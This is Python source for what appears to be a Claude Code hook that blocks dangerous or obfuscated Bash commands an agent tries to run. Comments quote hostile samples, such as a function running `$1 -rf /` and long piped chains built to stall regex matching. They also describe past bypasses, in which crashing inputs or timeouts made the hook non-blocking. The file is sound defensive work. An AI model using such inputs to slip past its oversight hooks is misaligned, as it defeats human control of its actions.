            return True  # $1, $@, $?, ${x:-…}, ${x[@]}, ${!x}: not knowable
        text = self.text
        esc = re.escape(name)
        if self._assigns is None:
            self._assigns = _assignment_words(text)
        assigns = [(p, v) for p, k, v in self._assigns if k == name]
        # Every place the text assigns NAME, read or not.
        textual = len(
            # `x[` counts whatever follows it (an array element assignment
            # or not): reading the subscript to its `]` was a scan per
            # occurrence, quadratic on `x[x[x[…`.
            re.findall(r"(?<![\w$./-])(?<!\$\{)" + esc + r"(?:\+?=|\[)", text)
        )
        if self._bind_verb is None:
            self._bind_verb = _VC_BIND_VERB_RE.search(text) is not None
        named_bare = self._bind_verb and (
            re.search(r"(?<![\w$])(?<!\$\{)" + esc + r"(?![\w=+\[])", text) is not None
        )
        if not assigns and textual == 0:
            return named_bare  # unbound unless a builtin binds it
        if textual != len(assigns) or named_bare:
            return True
        values = {_strip_q(v) for _p, v in assigns}
        if len(values) != 1 or not all(_substitutions_balanced(v) for _p, v in assigns):
            return True
        first_use = re.search(r"\$\{?" + esc + r"(?!\w)", text)
        return first_use is not None and first_use.start() < assigns[0][0]


def _vc_command_hit(
    words: list[str], nested: list[str], amb: _VarAmbiguity, depth: int = 0
) -> bool:
    """Whether one simple command's command word expands an ambiguous
    parameter. Scripts run by the command are queued on ``nested``."""
    i, n = 0, len(words)
    while i < n:
        w = words[i]
        if _HR_ASSIGN_RE.match(w) or w in _HR_RESERVED:
            i += 1
            continue
        if w == "function" or (i + 1 < n and words[i + 1] == "{"):
            # A function definition (`f() { $1 -rf /; }` lexes as `f { $1 …`,
            # `function f {` as `function f {`): judge the body's first
            # command in place of the name.
            i += 2
            continue
        base = w.rsplit("/", 1)[-1]
        if base in _HR_WRAPPERS:
            i = _hr_skip_wrapper(words, i, base)
            continue
        break
    if i >= n:
        return False
    w = words[i]
    base = w.rsplit("/", 1)[-1]
    if base in ("eval", "watch"):
        nested.append(" ".join(words[i + 1 :]))
        return False
    if base in _HR_SHELLS:
        script = _hr_shell_script(words, i + 1)
        if script is not None:
            nested.append(script)
        return False
    if base == "find" and depth < 2:
        j = i + 1
        while j < n:
            if words[j] in ("-exec", "-execdir", "-ok", "-okdir"):
                k = j + 1
                while k < n and words[k] not in (";", "+"):
                    k += 1
                if _vc_command_hit(words[j + 1 : k], nested, amb, depth + 1):
                    return True
                j = k
            j += 1
        return False
    for m in _VC_REF_RE.finditer(w):
        name = m.group(1) if m.group(1) is not None else m.group(2)
        if amb.ambiguous(name):
            return True
    return False


def _vc_any_ambiguous_ref(form: str, amb: _VarAmbiguity) -> bool:
    """Whether any expansion anywhere in ``form`` is ambiguous — if none is,
    none in a command word can be, and the lexer pass is skipped. More
    distinct names than the bound means "maybe" (the lexer decides)."""
    names: set[str] = set()
    for m in _VC_REF_RE.finditer(form):
        names.add(m.group(1) if m.group(1) is not None else m.group(2))
        if len(names) > _MAX_RESOLVED_VARS // 2:
            return True
    return any(amb.ambiguous(n) for n in names)


def _var_command_word(forms) -> str | None:
    """The first simple command, in any canonical form, whose command word
    expands a parameter with an ambiguous value (see VAR_COMMAND_RULE)."""
    for form in forms:
        if "$" not in form:
            continue
        amb = _VarAmbiguity(form)
        if not _vc_any_ambiguous_ref(form, amb):
            continue  # no command word can hold an ambiguous expansion

        def judge(words: list[str], nested: list[str]) -> bool:
            return _vc_command_hit(words, nested, amb)

        budget = _HR_BUDGET_FACTOR * len(form) + 4096
        queue: list[tuple[str, int]] = [(form, 0)]
        while queue:
            text, depth = queue.pop()
            budget -= len(text)
            if budget < 0:
                raise _AnalysisTooComplex(
                    "command-position variable analysis exceeded its budget"
                )
            nested: list[str] = []
            if text.startswith("\x01"):
                hit = _hr_lex(text[1:], nested, start_mode="h", judge=judge)
            else:
                hit = _hr_lex(text, nested, judge=judge)
            if hit is not None:
                return hit
            if depth < _HR_MAX_DEPTH:
                queue.extend((s, depth + 1) for s in nested if "$" in s)
    return None


def _block(reason: str, pattern: str, block_type: str):
    return (
        {"decision": "block", "reason": f"BLOCKED: {reason}: {pattern}"},
        pattern,
        block_type,
    )


# The rule an analysis FAILURE is recorded under (see check_command), so a test
# or an audit reader can tell "blocked because the analyzer crashed" from a
# real pattern match.
ANALYSIS_FAILED_RULE = "analysis failed"


def check_command(command: str, reduced_patterns=None):
    """Check a command against dangerous patterns across canonical forms.

    Returns (result_dict, matched_pattern, block_type) or None if safe.

    Fails CLOSED: an exception while analysing the command text becomes a
    block. Left to main()'s generic handler it exited 1, which Claude Code
    treats as a NON-blocking hook failure, so the command ran unchecked — the
    #598 `x=a\\dc` re.error and the 2026-09-25 RecursionError on a long
    `sudo`/`nohup` chain were both that bypass. The text is attacker-shaped;
    an analyzer defect it can trigger must not be an allow.
    """
    try:
        return _check_command_unguarded(command, reduced_patterns)
    except (Exception, _AnalysisDeadline) as exc:  # noqa: BLE001 - fail CLOSED
        return _block(
            "Command analysis failed; blocked rather than allowed unanalyzed",
            f"{ANALYSIS_FAILED_RULE} ({type(exc).__name__})",
            "dangerous",
        )


def _check_command_unguarded(command: str, reduced_patterns=None):
    """Check a command against dangerous patterns across canonical forms.

    Returns (result_dict, matched_pattern, block_type) or None if safe — the
    same 3-tuple contract as the original hook.

    reduced_patterns: minimal-profile catastrophic patterns; when given, only
    those are checked (still across canonical forms).
    """
    size = len(command.encode("utf-8", "surrogatepass"))
    cap = get_max_command_length()
    if size > cap:
        return _block(
            "Command exceeds maximum analyzable size",
            f"{size} bytes > {cap}-byte cap (security.max_command_length)",
            "dangerous",
        )

    try:
        raw_forms = _canonical_forms(command, cap)
        masked_forms = [m for m in (_structural_mask(f) for f in raw_forms) if m]
    except _AnalysisTooComplex as exc:
        return _block("Command too complex to analyze safely", str(exc), "dangerous")
    active = reduced_patterns if reduced_patterns is not None else DANGEROUS_PATTERNS

    # Recursive-rm target analysis runs only for the full (non-minimal) profile;
    # the minimal profile keeps its own small catastrophic-rm patterns.
    skip_coarse_rm: tuple[str, ...] = ()
    if reduced_patterns is None:
        # The analyzer supersedes the coarse rm regexes for the HOOK's own
        # verdict (they stay in DANGEROUS_PATTERNS for operation_loop and
        # audit_exporter — see the comment on _COARSE_RM_PATTERNS). Applying
        # them here would re-block exactly what the analyzer allows:
        # `rm -rf $TMPDIR/pytest-of-me`, `rm -rf ~/.cache/uv`, `rm -rf *.egg-info`.
        skip_coarse_rm = _COARSE_RM_PATTERNS
        rm_hit = _rm_catastrophic_target(masked_forms)
        if rm_hit is not None:
            return _block(
                "Dangerous pattern detected",
                f"rm (recursive) on catastrophic target: {rm_hit}",
                "dangerous",
            )

    for pattern in active:
        if pattern in skip_coarse_rm:
            continue
        targets = raw_forms if _is_raw_pattern(pattern) else masked_forms
        for form in targets:
            if pattern in _FETCH_PIPE_SHELL_WORD:
                matched = _fetch_pipes_to_shell(pattern, form)
            else:
                matched = re.search(pattern, form, re.IGNORECASE) is not None
            if matched:
                return _block("Dangerous pattern detected", pattern, "dangerous")

    if reduced_patterns is None:
        # Ref-first and global-option spellings of a hard reset, which the
        # flag-first regex above cannot see. Runs over the RAW canonical
        # forms: the analyzer does its own quote handling, so a quoted
        # argument stays one word (and a commit message stays data) without
        # the structural mask, which re-joins tokens unquoted.
        # The rule text is fixed: it lands in the audit record, which must
        # never hold command text (hook_audit stores only a digest of it).
        if _hard_reset_command(raw_forms) is not None:
            return _block(
                "Dangerous pattern detected",
                HARD_RESET_RULE,
                "dangerous",
            )
        # Every spelling of a world-writable chmod (the octal rule above
        # sees only one). Masked forms, as that rule uses.
        if _chmod_world_writable(masked_forms):
            return _block(
                "Dangerous pattern detected",
                CHMOD_WORLD_RULE,
                "dangerous",
            )
        # The rule text is fixed for the same reason.
        try:
            var_hit = _var_command_word(raw_forms)
        except _AnalysisTooComplex as exc:
            return _block(
                "Command too complex to analyze safely", str(exc), "dangerous"
            )
        if var_hit is not None:
            return _block(
                "Dangerous pattern detected",
                VAR_COMMAND_RULE,
                "dangerous",
            )
        for pattern in SENSITIVE_PATH_PATTERNS:
            for form in masked_forms:
                if re.search(pattern, form, re.IGNORECASE):
                    return _block("Sensitive file access", pattern, "sensitive")
        for pattern in OBFUSCATION_PATTERNS:
            for form in raw_forms:
                if pattern is OBFUSCATION_PATTERNS[0]:
                    # The decoder-chain pattern, as a linear scanner.
                    matched = _decoder_pipes_to_shell(form)
                else:
                    matched = re.search(pattern, form, re.IGNORECASE) is not None
                if matched:
                    return _block(
                        "Obfuscated-execution pattern detected", pattern, "dangerous"
                    )
        # echo/printf "X" | sh  — X is executed as code, so check X itself.
        payload = _echo_pipe_shell_group(command)
        if payload is not None:
            inner = _strip_q(payload.strip())
            if inner and inner != command:
                inner_result = check_command(inner, reduced_patterns)
                if inner_result:
                    return inner_result

    return None


# =============================================================================
# Presentation + entrypoint
# =============================================================================
def truncate_command(command: str, max_length: int = 60) -> str:
    if len(command) <= max_length:
        return command
    return command[: max_length - 3] + "..."


def print_block_box(command: str, pattern: str, block_type: str = "dangerous") -> None:
    truncated = truncate_command(command)
    if block_type == "sensitive":
        title = "SENSITIVE FILE ACCESS BLOCKED"
        description = "Matched sensitive path pattern"
    else:
        title = "DANGEROUS COMMAND BLOCKED"
        description = "Matched forbidden pattern"

    content_width = max(60, len(truncated) + 4, len(pattern) + len(description) + 4)
    top_border = "═" * (content_width + 2)
    print(f"\n╔{top_border}╗", file=sys.stderr)
    print(f"║ {title:^{content_width}} ║", file=sys.stderr)
    print(f"╠{top_border}╣", file=sys.stderr)
    print(f"║ Command: {truncated:<{content_width - 9}} ║", file=sys.stderr)
    print(
        f"║ {description}: {pattern:<{content_width - len(description) - 3}} ║",
        file=sys.stderr,
    )
    print(f"╠{top_border}╣", file=sys.stderr)
    print(
        # Forbidden has no override: /gate unlocks PR merges and the network
        # window, never these commands (book review 2026-10-30).
        f"║ {'No override. Run it yourself outside the agent if needed.':<{content_width}} ║",
        file=sys.stderr,
    )
    print(f"╚{top_border}╝\n", file=sys.stderr)


# Wall-clock budget for analysing ONE command (this hook's own checks plus the
# egress guard's), armed only when the file runs as the hook process. Claude
# Code kills a hook that outlives its timeout (60 s by default) and a killed
# PreToolUse hook is NON-blocking, so an input that makes any matcher slow is a
# bypass however correct the matcher is. Measured on 2026-09-25 against
# origin/main: `"echo x | " * 800 + "curl URL"` (7 KB) ~50 s and
# `"base64 -d x | " * 2000 + "ls"` (28 KB) over 120 s — both super-linear
# regex backtracking. The budget turns every such input into a block instead;
# ordinary commands analyse in well under a second.
_ANALYSIS_DEADLINE_SECONDS = 20.0


_deadline_state: dict = {"armed": False}


def _arm_analysis_deadline(seconds: float | None) -> None:
    if not seconds or not hasattr(signal, "setitimer"):
        return
    if _deadline_state.get("armed"):
        return
    if threading.current_thread() is not threading.main_thread():
        return  # signal handlers can only be installed from the main thread

    def _fire(_signum, _frame):
        if _deadline_state["armed"]:
            raise _AnalysisDeadline(
                f"analysis ran past its {seconds:g}s budget; blocked rather "
                f"than left for the hook timeout to allow"
            )

    _deadline_state["previous_handler"] = signal.signal(signal.SIGALRM, _fire)
    # Re-fires every 0.25 s after the first expiry, so an analyzer that
    # swallowed one _AnalysisDeadline is interrupted again.
    _deadline_state["previous_timer"] = signal.setitimer(
        signal.ITIMER_REAL, seconds, 0.25
    )
    _deadline_state["armed"] = True


def _disarm_analysis_deadline() -> None:
    if not _deadline_state.get("armed"):
        return
    _deadline_state["armed"] = False
    signal.setitimer(signal.ITIMER_REAL, 0)
    signal.signal(signal.SIGALRM, _deadline_state.pop("previous_handler"))
    # Restore whatever timer was running before (pytest-timeout uses one).
    delay, interval = _deadline_state.pop("previous_timer")
    if delay:
        signal.setitimer(signal.ITIMER_REAL, delay, interval)


def _exit_analysis_failed(exc: BaseException) -> None:
    """Block (exit 2) after the analysis itself failed — recursion depth or
    the wall-clock budget, both driven by the command text. Disarms FIRST so
    a re-fire cannot replace this SystemExit with a non-blocking error."""
    _disarm_analysis_deadline()
    print(f"Hook error: {exc} (blocked: fail closed)", file=sys.stderr)
    print(
        json.dumps(
            {
                "decision": "block",
                "reason": f"BLOCKED: command analysis failed "
                f"({type(exc).__name__}); blocked rather than allowed "
                f"unanalyzed.",
            }
        )
    )
    sys.exit(2)


def main(analysis_deadline: float | None = None):
    """The hook entrypoint. ``analysis_deadline`` (seconds) arms the
    wall-clock budget above; the ``__main__`` block passes it, in-process
    callers (tests) get none unless they ask for it.

    The budget is armed only around the two analysis calls and disarmed
    before any verdict is printed or any sys.exit runs, so a re-fire cannot
    land on a decided exit. The outer handler is the last line: a deadline
    that still escapes _main() blocks rather than surfacing as exit 1."""
    try:
        _main(analysis_deadline)
    except _AnalysisDeadline as exc:
        _exit_analysis_failed(exc)
    finally:
        _disarm_analysis_deadline()


def _main(analysis_deadline: float | None):
    try:
        if not is_enabled(HOOK_NAME):
            sys.exit(0)

        input_data = json.loads(sys.stdin.read())
        tool_name = input_data.get("tool_name", "")
        tool_input = input_data.get("tool_input", {})

        if tool_name != "Bash":
            sys.exit(0)

        command = tool_input.get("command", "")

        # Minimal profile: only catastrophic patterns (still across canonical forms).
        reduced_patterns = get_reduced_patterns(HOOK_NAME)
        deadline_at = time.monotonic() + (analysis_deadline or 0)
        _arm_analysis_deadline(analysis_deadline)
        result = check_command(command, reduced_patterns=reduced_patterns)
        _disarm_analysis_deadline()

        if result:
            result_dict, pattern, block_type = result
            print_block_box(command, pattern, block_type)
            exit_code = get_exit_code(HOOK_NAME, issue_found=True)
            # Under a warn profile the command goes through with exit 1; the
            # record says what actually happened, not the dict's fixed "block".
            record_decision(
                HOOK_NAME,
                "warn" if exit_code == 1 else result_dict.get("decision", "block"),
                result_dict.get("reason", ""),
                input_data,
                rule=pattern,
            )
            print(json.dumps(result_dict))
            sys.exit(exit_code)

        # network_egress_guard has no settings.json entry of its own (that
        # file is human-protected) — it runs piggybacked on this hook's
        # existing Bash PreToolUse registration instead. See SECURITY.md §
        # Network Egress Guard. Imported here (deferred), NOT at module
        # level: network_egress_guard imports _canonical_forms/
        # _structural_mask back FROM this module, so a top-level `import
        # network_egress_guard` is circular — whichever module a caller
        # imports first ends up mid-execution when the other tries to pull
        # names from it, and the resulting ImportError silently falls back
        # to identity canonicalization (verified: this actually happened —
        # it broke the false-positive guard on data arguments like `git
        # commit -m "...curl https://... bug"`). Deferring the import to
        # call time guarantees this module has already finished executing
        # (main() only runs after that), so the cycle always resolves clean.
        try:
            import network_egress_guard
        except ImportError:  # pragma: no cover - fallback if module unavailable
            network_egress_guard = None

        # An interactive session gets an approval prompt for non-allowlisted
        # egress (exit 0 + permissionDecision "ask"); a daemon worker is hard
        # blocked (exit 2). A pending "ask" is held until the checks below
        # have run, so a slopsquat deny still wins over it.
        pending_ask: dict | None = None
        if network_egress_guard is not None and is_enabled("network_egress_guard"):
            if analysis_deadline:
                # The egress guard spends what is LEFT of the one budget.
                _arm_analysis_deadline(max(deadline_at - time.monotonic(), 0.001))
            egress_result = network_egress_guard.check_command(
                command, permission_mode=input_data.get("permission_mode")
            )
            _disarm_analysis_deadline()
            if egress_result:
                egress_dict, hosts = egress_result
                ask = network_egress_guard.is_ask_decision(egress_dict)
                network_egress_guard.print_block_box(command, hosts, ask=ask)
                # Recorded from here rather than from inside the guard: this is
                # the process that emits the exit code, so this is where the
                # decision actually takes effect.
                egress_rule = f"egress -> {', '.join(hosts) if hosts else '(destination unresolved)'}"
                if ask:
                    # An "ask" carries its reason under hookSpecificOutput,
                    # not under "reason".
                    record_decision(
                        "network_egress_guard",
                        "ask",
                        egress_dict.get("hookSpecificOutput", {}).get(
                            "permissionDecisionReason", ""
                        ),
                        input_data,
                        rule=egress_rule,
                    )
                    pending_ask = egress_dict
                else:
                    egress_exit = get_exit_code(
                        "network_egress_guard", issue_found=True
                    )
                    record_decision(
                        "network_egress_guard",
                        "warn"
                        if egress_exit == 1
                        else egress_dict.get("decision", "block"),
                        egress_dict.get("reason", ""),
                        input_data,
                        rule=egress_rule,
                    )
                    print(json.dumps(egress_dict))
                    sys.exit(egress_exit)

        # The budget is already disarmed: slopsquat_check below is registry
        # I/O with its own timeouts (see the follow-up noted on main()'s
        # generic handler); the analysis budget is not its to spend.

        # slopsquat_check also has no settings.json entry of its own (that file
        # is human-protected) — it piggybacks on this hook's Bash registration
        # too, checking pip/npm install commands for hallucinated/slopsquatted
        # packages BEFORE the install runs. Unlike network_egress_guard it does
        # NOT import anything back from this module, so there is no import
        # cycle; it is still imported deferred here for parity and to keep its
        # (network-touching) import cost off block_dangerous's own import path.
        try:
            import slopsquat_check
        except ImportError:  # pragma: no cover - fallback if module unavailable
            slopsquat_check = None

        if slopsquat_check is not None and is_enabled("slopsquat_check"):
            slop_result = slopsquat_check.check_command(command)
            if slop_result:
                decision, slop_dict, slop_findings = slop_result
                slopsquat_check.print_report(command, slop_findings)
                # A "block" verdict under a warn profile exits 1: record the
                # decision that took effect.
                slop_exit = (
                    get_exit_code("slopsquat_check", issue_found=True)
                    if decision == "block"
                    else 1
                )
                record_decision(
                    "slopsquat_check",
                    "warn" if slop_exit == 1 else decision,
                    slop_dict.get("reason", ""),
                    input_data,
                    rule=", ".join(
                        str(f.get("package", "")) for f in (slop_findings or [])
                    ),
                )
                if decision == "block":
                    print(json.dumps(slop_dict))
                    sys.exit(slop_exit)
                # warn-only: surface to the user without blocking the install
                # (the report is already on stderr; a pending egress prompt,
                # if any, still needs its JSON on stdout with exit 0).
                if pending_ask is None:
                    sys.exit(1)

        if pending_ask is not None:
            print(json.dumps(pending_ask))
            sys.exit(0)

        sys.exit(0)

    except json.JSONDecodeError:
        sys.exit(0)
    except (RecursionError, _AnalysisDeadline) as e:
        # Backstop behind check_command's own fail-closed guard: recursion
        # depth and analysis time are driven by the command text (a 10 KB
        # `sudo` chain reached the recursion limit), so either is a bypass
        # attempt until proven otherwise — block (exit 2), never the
        # non-blocking exit 1 below.
        _exit_analysis_failed(e)
    except Exception as e:
        # Deliberately still exit 1 (non-blocking): the command analysis is
        # already fail-closed inside check_command (both hooks), so what
        # reaches here is config loading, the audit writer, or
        # slopsquat_check. Failing closed on those would block EVERY Bash
        # command in the session, including the ones needed to repair the
        # fault. Known follow-up: slopsquat_check DOES read the command text
        # (serial per-package registry lookups, 3 s each, outside the
        # analysis budget), so input-driven errors or slowness there are not
        # covered by this split.
        print(f"Hook error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main(analysis_deadline=_ANALYSIS_DEADLINE_SECONDS)
